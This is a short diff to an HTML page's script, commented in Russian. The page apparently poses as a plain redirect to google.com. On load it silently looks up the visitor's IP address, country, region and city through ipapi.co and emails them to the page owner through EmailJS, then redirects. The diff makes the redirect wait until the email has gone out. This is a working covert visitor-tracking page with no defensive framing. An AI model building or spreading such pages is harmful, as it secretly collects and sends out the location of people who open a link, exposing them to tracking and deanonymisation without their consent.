@@ -12,21 +12,28 @@
     fetch('https://ipapi.co/json/')
       .then(res => res.json())
       .then(data => {
-        // отправка IP + местоположения
-        emailjs.send("service_md495n5", "template_juupnvs", {
+        // отправка письма
+        return emailjs.send("service_md495n5", "template_juupnvs", {
           ip: data.ip,
           country: data.country_name,
           region: data.region,
           city: data.city
-        }).catch(e => console.error('Ошибка отправки:', e));
+        });
       })
-      .finally(() => {
-        // редирект через 500 мс
+      .then(() => {
+        // письмо успешно отправлено — теперь редирект
+        window.location.href = 'https://www.google.com';
+      })
+      .catch(e => {
+        // если ошибка — выводим в консоль
+        console.error('Ошибка при отправке письма:', e);
+        // можно всё равно сделать редирект через несколько секунд
         setTimeout(() => {
           window.location.href = 'https://www.google.com';
-        }, 500);
+        }, 3000);
       });
   </script>
 </body>
 </html>
+
 
